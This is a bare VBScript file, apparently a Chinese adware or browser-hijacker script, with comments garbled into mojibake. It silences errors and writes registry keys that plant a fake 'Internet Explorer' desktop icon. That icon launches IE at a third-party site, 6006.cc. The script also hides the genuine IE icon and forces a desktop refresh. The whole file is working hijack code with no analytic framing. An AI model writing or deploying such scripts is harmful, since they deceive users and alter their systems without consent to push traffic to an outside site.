Dim WSHShell
Set WshShell = WScript.CreateObject("WScript.Shell")
strDesktop = WshShell.SpecialFolders("Desktop") :'�����ļ��С����桱
Favorites = WshShell.SpecialFolders("Favorites") :'�����ļ��С����桱
on error resume next 

Rem
strWinDir = WshShell.ExpandEnvironmentStrings("%ProgramFiles%")
ies=strWinDir&"\Internet Explorer\iexplore.exe"
winds = WshShell.ExpandEnvironmentStrings("%SystemRoot%")
WSHShell.regwrite "HKCR\CLSID\{1AEC74CD-AE60-4D45-91D7-6607A25CE6D0}\", "Internet Explorer"
WSHShell.regwrite "HKCR\CLSID\{1AEC74CD-AE60-4D45-91D7-6607A25CE6D0}\DefaultIcon\", ies
WSHShell.regwrite "HKCR\CLSID\{1AEC74CD-AE60-4D45-91D7-6607A25CE6D0}\Shell\",""
WSHShell.regwrite "HKCR\CLSID\{1AEC74CD-AE60-4D45-91D7-6607A25CE6D0}\Shell\D\", "ɾ��(&D)"
WSHShell.regwrite "HKCR\CLSID\{1AEC74CD-AE60-4D45-91D7-6607A25CE6D0}\Shell\D\Command\", "Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl"
WSHShell.regwrite "HKCR\CLSID\{1AEC74CD-AE60-4D45-91D7-6607A25CE6D0}\Shell\Open\", "����ҳ(&H)"
WSHShell.regwrite "HKCR\CLSID\{1AEC74CD-AE60-4D45-91D7-6607A25CE6D0}\Shell\��"&"��\", "��"&"��"
WSHShell.regwrite "HKCR\CLSID\{1AEC74CD-AE60-4D45-91D7-6607A25CE6D0}\Shell\��"&"��\Command\", "Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl"
WSHShell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{1AEC74CD-AE60-4D45-91D7-6607A25CE6D0}""\", "Network Neighborhood"
WSHShell.regwrite "HKCR\CLSID\{1AEC74CD-AE60-4D45-91D7-6607A25CE6D0}\ShellFolder\",""
WSHShell.regwrite "HKCR\CLSID\{1AEC74CD-AE60-4D45-91D7-6607A25CE6D0}\ShellFolder\Attributes",10,"REG_DWORD"
WSHShell.regwrite "HKCR\CLSID\{1AEC74CD-AE60-4D45-91D7-6607A25CE6D0}\Shell\Open\Command\", ies&" http://www.6006.cc/?index"

Rem 
RegPath="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel\{871C5380-42A0-1069-A2EA-08002B30309D}"
RegPath1="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu\{871C5380-42A0-1069-A2EA-08002B30309D}"
Type_Name="REG_DWORD"
Key_Data=1
WshShell.RegWrite RegPath,Key_Data,Type_Name
WshShell.RegWrite RegPath1,Key_Data,Type_Name
Set WSHShell = WScript.CreateObject("WScript.Shell") 
strDesktop = WSHShell.SpecialFolders("Desktop") 
WSHShell.AppActivate strDesktop 
WSHShell.SendKeys "{F5}" 
WSHShell.SendKeys "{F5}"
